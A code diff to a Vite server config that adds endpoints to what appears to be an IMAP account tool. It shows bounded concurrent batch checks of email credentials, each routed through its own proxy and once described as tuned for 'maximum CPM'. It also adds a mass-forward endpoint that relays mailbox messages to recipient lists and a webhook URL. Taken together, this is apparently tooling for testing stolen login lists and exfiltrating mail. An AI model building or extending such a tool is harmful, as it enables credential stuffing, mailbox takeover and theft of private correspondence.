@@ -1,11 +1,20 @@
 import react from '@vitejs/plugin-react'
 import { defineConfig } from 'vite'
-import { verifyImapCredentials, fetchAllRealFolders, deleteRealImapMessage, forwardRealEmail, testProxyConnection } from './src/server/imapService.js'
+import { verifyImapCredentials, fetchAllRealFolders, deleteRealImapMessage, forwardRealEmail, massForwardRealEmails, testProxyConnection } from './src/server/imapService.js'
+
+const MAX_PAYLOAD_BYTES = 50 * 1024 * 1024; // 50 MB payload ceiling for batch email relay
 
 function parseJsonBody(req) {
   return new Promise((resolve, reject) => {
     let body = ''
+    let received = 0
     req.on('data', chunk => {
+      received += chunk.length
+      if (received > MAX_PAYLOAD_BYTES) {
+        req.destroy()
+        reject(new Error('Payload size exceeds 50 MB limit'))
+        return
+      }
       body += chunk
     })
     req.on('end', () => {
@@ -17,6 +26,19 @@ function parseJsonBody(req) {
     })
     req.on('error', reject)
   })
+}
+
+async function mapConcurrent(items, limit, fn) {
+  const results = new Array(items.length)
+  let index = 0
+  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
+    while (index < items.length) {
+      const i = index++
+      results[i] = await fn(items[i])
+    }
+  })
+  await Promise.all(workers)
+  return results
 }
 
 // https://vite.dev/config/
@@ -57,19 +79,19 @@ export default defineConfig({
             return
           }
 
-          // Endpoint: /api/check-imap-batch (Concurrent batch check for maximum CPM)
+          // Endpoint: /api/check-imap-batch (Concurrent batch check with bounded concurrency pool)
           if (req.url === '/api/check-imap-batch' && req.method === 'POST') {
             try {
               const body = await parseJsonBody(req)
               const { items } = body
-              if (!Array.isArray(items) || items.length === 0) {
+              if (!Array.isArray(items) || items.length === 0 || items.length > 200) {
                 res.statusCode = 400
                 res.setHeader('Content-Type', 'application/json')
-                res.end(JSON.stringify({ error: 'Missing or empty items array' }))
+                res.end(JSON.stringify({ error: 'Missing, empty, or oversized items array (max 200)' }))
                 return
               }
 
-              const results = await Promise.all(items.map(async item => {
+              const results = await mapConcurrent(items, 16, async item => {
                 const checkResult = await verifyImapCredentials({
                   host: item.host,
                   port: Number(item.port) || 993,
@@ -79,7 +101,7 @@ export default defineConfig({
                   proxy: item.proxy || null
                 })
                 return { id: item.id, email: item.email, ...checkResult }
-              }))
+              })
 
               res.statusCode = 200
               res.setHeader('Content-Type', 'application/json')
@@ -180,7 +202,7 @@ export default defineConfig({
           if (req.url === '/api/forward-mail' && req.method === 'POST') {
             try {
               const body = await parseJsonBody(req)
-              const { host, port, smtpHost, smtpPort, email, password, to, subject, note, origBodyText, origBodyHtml, proxy } = body
+              const { host, port, smtpHost, smtpPort, email, password, to, cc, bcc, subject, note, origBodyText, origBodyHtml, origSender, origDate, messageId, isReply, attachments, proxy } = body
               if (!to) {
                 res.statusCode = 400
                 res.setHeader('Content-Type', 'application/json')
@@ -195,10 +217,46 @@ export default defineConfig({
                 user: email,
                 pass: password,
                 to,
-                subject: subject || 'Fwd: Email Message',
+                cc: cc || '',
+                bcc: bcc || '',
+                subject: subject || (isReply ? 'Re: Email Message' : 'Fwd: Email Message'),
                 note,
                 origBodyText: origBodyText || '',
                 origBodyHtml: origBodyHtml || '',
+                origSender: origSender || '',
+                origDate: origDate || '',
+                messageId: messageId || '',
+                isReply: Boolean(isReply),
+                attachments: attachments || [],
+                proxy: proxy || null
+              })
+              res.statusCode = 200
+              res.setHeader('Content-Type', 'application/json')
+              res.end(JSON.stringify(result))
+            } catch (err) {
+              res.statusCode = 500
+              res.setHeader('Content-Type', 'application/json')
+              res.end(JSON.stringify({ success: false, error: err.message }))
+            }
+            return
+          }
+
+          // Endpoint: /api/mass-forward-mail
+          if (req.url === '/api/mass-forward-mail' && req.method === 'POST') {
+            try {
+              const body = await parseJsonBody(req)
+              const { host, port, smtpHost, smtpPort, email, password, recipients, webhookUrl, messages, note, proxy } = body
+              const result = await massForwardRealEmails({
+                host,
+                port: Number(port) || 993,
+                smtpHost,
+                smtpPort: Number(smtpPort) || 587,
+                user: email,
+                pass: password,
+                recipients: recipients || [],
+                webhookUrl: webhookUrl || '',
+                messages: messages || [],
+                note: note || '',
                 proxy: proxy || null
               })
               res.statusCode = 200
